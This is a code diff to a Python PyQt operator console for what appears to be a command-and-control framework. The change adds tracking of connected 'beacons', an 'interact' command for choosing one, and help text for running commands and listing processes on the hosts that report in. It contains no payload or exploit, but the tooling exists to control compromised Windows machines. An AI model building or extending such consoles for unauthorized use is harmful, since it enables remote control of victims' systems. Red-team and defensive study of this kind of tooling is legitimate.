@@ -14,6 +14,9 @@ BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.Y
 
 # Configuration Settings
 listening_mgr_addr = "http://192.168.1.3:5000"
+beacon_IDs = [] # Our beacon array
+BeaconInteraction = False # Our switch between selection of beacons
+beacon_ID = "" # Our var to hold beacon data from list
 
 def bullet(char, color):
     C = FB if color == 'B' else FR if color == 'R' else FG
@@ -112,21 +115,28 @@ class mainWidget(QtWidgets.QWidget):
         self.label.setText(QtCore.QCoreApplication.translate("Form", u">>>", None))
         
 
-    def echoCommand(self):
+    def echoCommand(self, beaconID=""):
+        global beacon_ID # Fix
         text = self.lineEdit.text()
         print(f"text :{text}")
         if text == '':
             return
+        
+        if beaconID != '': # If not empty then set text to empty
+            text = ''
 
-        self.textEdit.append(f"{TextColors.Red('<br>Beacon>')} {text}")
+        if BeaconInteraction == True: # If interaction set to true then loop through the list and look for the matching beaconID
+            for i in range(len(beacon_IDs)):
+                if beacon_IDs[i] == beaconID:
+                    beacon_ID = beacon_IDs[i]
+        
+        self.textEdit.append(f"{TextColors.Red(f'<br>Beacon ({beacon_ID})>')} {text}")
     
     def parseCommand(self):
         command = self.lineEdit.text()
         command = command.split(" ")
         metaCommand = command.pop(0)  # remove the first word from the command array and save as the metacommand
         subCommand = ' '.join(map(str, command))  # Convert the command array back into a string. Returns the subcommand
-        # self.textEdit.append("  {} {}".format("MetaCommand:",metaCommand))
-        # self.textEdit.append("  {} {}".format("SubCommand: ",subCommand))
         if metaCommand == "help":
             self.helpMenu()
         if metaCommand == "cmd":
@@ -135,13 +145,16 @@ class mainWidget(QtWidgets.QWidget):
             self.listProcesses()
         if metaCommand == "clear":
             self.textEdit.clear()
+        if metaCommand == "interact":
+            self.beacon_interact(subCommand)
 
     def helpMenu(self):
         r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
-        r2 = "{0:<8s}-   {1}".format("cmd", "Execute a command.")
+        r2 = "{0:<8s}-   {1}".format("cmd [command]", "Execute a command.")
         r3 = "{0:<8s} -   {1}".format("ps", "List the running processes.")
         r4 = "{0:<8s} -   {1}".format("clear", "Clear output from display.")
-        menu = "{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4)
+        r5 = "{0:<8s} -   {1}".format("interact [Beacon ID]", "Interact with selected beacon.")
+        menu = "{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5)
         self.textEdit.append(TextColors.Green(menu))
     
     def clearCommandInput(self):
@@ -152,6 +165,15 @@ class mainWidget(QtWidgets.QWidget):
         self.echoCommand()
         self.parseCommand()
         self.clearCommandInput()
+    
+    def beacon_interact(self, beacon_id):
+        global BeaconInteraction # Fix
+        if beacon_id in beacon_IDs: # Check the list if beacon ID exists and is matching the value
+            BeaconInteraction = True
+            self.textEdit.append(f"[+] Interacting with : {beacon_id} [+]\n")
+            self.echoCommand(beacon_id)
+        else:
+            self.textEdit.append("Beacon ID does not match!\n")
     
     def beacon_time(self,arg):
         while True:
@@ -174,6 +196,9 @@ class mainWidget(QtWidgets.QWidget):
         ip_addr = output["IP"][::]
         pid = output["PID"][::]
         beacon_id = output["beacon_id"][::]
+
+        beacon_IDs.append(beacon_id) # Add beacon id to our list
+
         proc_name = output["Process Name"][::]
         pub_ip = output["Public IP"][::]
         win_ver = output["Windows Version"][::]
@@ -182,6 +207,7 @@ class mainWidget(QtWidgets.QWidget):
         self.currentRowCount = self.tableWidget.rowCount()
         self.tableWidget.insertRow(self.currentRowCount)
 
+        # Our records
         self.tableWidget.setItem(self.currentRowCount, 0, QtWidgets.QTableWidgetItem(beacon_id))
         self.tableWidget.setItem(self.currentRowCount, 1, QtWidgets.QTableWidgetItem(pub_ip))
         self.tableWidget.setItem(self.currentRowCount, 2, QtWidgets.QTableWidgetItem(ip_addr))
